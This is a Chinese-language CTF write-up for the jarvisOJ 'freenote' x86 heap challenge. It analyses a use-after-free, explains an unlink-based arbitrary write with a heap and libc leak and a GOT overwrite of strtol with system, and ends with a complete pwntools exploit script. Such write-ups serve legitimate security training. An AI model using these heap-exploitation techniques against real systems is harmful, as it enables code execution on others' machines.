# jarvisOJ level6 x86

### 0x0 前置补偿

[Unlink-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)

[main_arena 在libc里的相关偏移量]([https://binlep.github.io/2019/10/15/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/](https://binlep.github.io/2019/10/15/[Pwn 笔记]堆利用总结/))

### 0x1 分析

看一下安全性。

<img src="https://i.loli.net/2020/02/27/UYecC5uA2sOd1th.png" style="zoom:50%;" />

堆栈上的代码是没办法执行的。got表可以修改。

`main`：

```c
int __cdecl main()
{
  unsigned int v0; // eax

  buf();
  preload();
  while ( 1 )
  {
    v0 = menu();
LABEL_3:
    switch ( v0 )
    {
      case 1u:
        list();                                
        continue;
      case 2u:
        create();
        continue;
      case 3u:
        edit();
        continue;
      case 4u:
        delete();
        v0 = menu();
        if ( v0 > 5 )
          goto LABEL_6;
        goto LABEL_3;
      case 5u:                                  
        puts("Bye");
        return 0;
      default:
LABEL_6:
        puts("Invalid!");
        break;
    }
  }
}
```



分析一下`main`代码，主要以下几个功能

1. List Note：按格式打印所有note
2. New Note：新建一个note，但是输入内容的最后一个字符没有置零。
3. Edit Note：编辑指定note，若内容长度变化，relloc一个合适空间。
4. Delete Note：free指定note，但是没有在note表中的note指针置零。

另外，这其实是两个结构体：可以在`preload`函数里观察到。

```c
struct noteList{
  int noteNumMax;
  int noteCount;
  struct note[];
};

struct note{
  bool flag;
  int contentLen;
  char *content;
}
```

所以到此为止，我们发现这里有一个UAF漏洞，因为free指定note之后，noteList中相关note指针并没有置零。

大致思路就是通过list函数来泄漏出其中一个`chunk`的地址，从而得到heap的基地址。

再通过Unlink来修改`note[];`中的指针，从而实现任意地址的修改，再修改GOT表，完成执行`/bin/sh`。

首先我们泄漏`main_arena`地址。先`malloc`出几个note防止free note的时候合并到`top chunk`。

因为`Unsorted Bin`是一个双向循环链表，后进去的`chunk`的`fd`指针指向前一个`chunk`，我们可以通过溢出，来泄漏`fd`指向的`chunk`地址。

```python
#leak heapbase
create(p, 'A' * 0x80)         #idx:0
create(p, 'A' * 0x80)         #idx:1
create(p, 'A' * 0x80)         #idx:2
create(p, 'A' * 0x80)         #idx:3
create(p, 'A' * 0x80)         #idx:4
# debug(p, 'b*0x080484D0')
delete(p, 3)
delete(p, 1)

payload = 'A'*0x80 + 'a'*0x8	
edit(p, 0, payload)
list(p)						#leak chunk3 addr
p.recvuntil('a' * 0x8)
heap_base = u32(p.recv(4)) - 0xC10 - 0x88 * 3 - 0x8	#preload中malloc过一个大chunk。
chunk0_addr = heap_base + 0x18
chunk1_addr = heap_base + 0x08 + 0xc10 + 0x88 * 1 + 0x08
```

接下来是Unlink。

如果已经free掉`note0`如果再free`note1`的话，系统会合并`note1`和`note0`。前提是他们地址相邻。

我们在`note0`伪造一个`chunk`，来unlink这个`chunk`就可以修改`noteList`中的指针。

```python
payload = p32(0x88) + p32(0x80) + p32(chunk0_addr - 0xc) + p32(chunk0_addr - 0x8)	#构造的chunk地址为notelist上存的第一个note的地址。

payload = payload + 'a' * (0x80 - 0x4 * 4) + p32(0x80) + p32(0x88)	#修改note1所在chunk的pre_size和size。

edit(p, 0, payload)
delete(p, 1)	#unlink
```

接下来，note0指向&note0 - 0xC的位置。

所以我们可以通过`edit(0)`来修改`noteList`中的指针。

参考某大佬的wp，我们修改note2上的地址为`"strtol"`的got地址，来泄漏libc地址。

```python
payload = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr - 0xc)
payload = payload + p32(1) + p32(0x4) + p32(elf.got["strtol"])
payload = payload.ljust(0x88, '\x00')
edit(p, 0, payload)
list(p)
p.recvuntil("0. ")
p.recvuntil("1. ")
libc_Base = u32(p.recv(4)) - libc.symbols["strtol"]
```

修改`"strtol"`的got为`system`地址即可完成。

```python
system_addr = libc_Base + system_libc
edit(p, 1, p32(system_addr))
```

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug' 
context.terminal = ['tmux', 'splitw', '-h']
# p = remote("pwn2.jarvisoj.com", 9885)
p = process('./freenote_x86')
elf = ELF("./freenote_x86")
# libc = ELF("./libc-2.19.so")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

memalign_hook_libc = libc.symbols["__memalign_hook"]
system_libc = libc.symbols["system"]

def debug(p, cmd):
  '''cmd = 'b *%d' %(proc_base+breakaddr)'''
  gdb.attach(p, cmd)
  pause()

def create(p, content):
  p.sendlineafter("Your choice: ", "2")
  p.sendlineafter("Length of new note: ", str(len(content)))
  p.sendafter("Enter your note: ", content)

def list(p):
  p.sendlineafter("Your choice: ", "1")

def edit(p, idx, content):
  p.sendlineafter("Your choice: ", "3")
  p.sendlineafter("Note number: ", str(idx))
  p.sendlineafter("Length of note: ", str(len(content)))
  p.sendafter("Enter your note:", content)

def delete(p, idx):
  p.sendlineafter("Your choice: ", "4")  
  p.sendlineafter("Note number: ", str(idx))

#leak heapbase
create(p, 'A' * 0x80)         #idx:0
create(p, 'A' * 0x80)         #idx:1
create(p, 'A' * 0x80)         #idx:2
create(p, 'A' * 0x80)         #idx:3
create(p, 'A' * 0x80)         #idx:4
# debug(p, 'b*0x080484D0')
delete(p, 3)
delete(p, 1)

payload = 'A'*0x80 + 'a'*0x8
edit(p, 0, payload)
list(p)
p.recvuntil('a' * 0x8)
heap_base = u32(p.recv(4)) - 0xC10 - 0x88 * 3 - 0x8
chunk0_addr = heap_base + 0x18
chunk1_addr = heap_base + 0x08 + 0xc10 + 0x88 * 1 + 0x08

payload = p32(0x88) + p32(0x80) + p32(chunk0_addr - 0xc) + p32(chunk0_addr - 0x8)
payload = payload + 'a' * (0x80 - 0x4 * 4) + p32(0x80) + p32(0x88)
edit(p, 0, payload)
delete(p, 1)

payload = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr - 0xc)
payload = payload + p32(1) + p32(0x4) + p32(elf.got["strtol"])
payload = payload.ljust(0x88, '\x00')
edit(p, 0, payload)
list(p)
p.recvuntil("0. ")
p.recvuntil("1. ")
libc_Base = u32(p.recv(4)) - libc.symbols["strtol"]
system_addr = libc_Base + system_libc

edit(p, 1, p32(system_addr))

p.interactive()
```



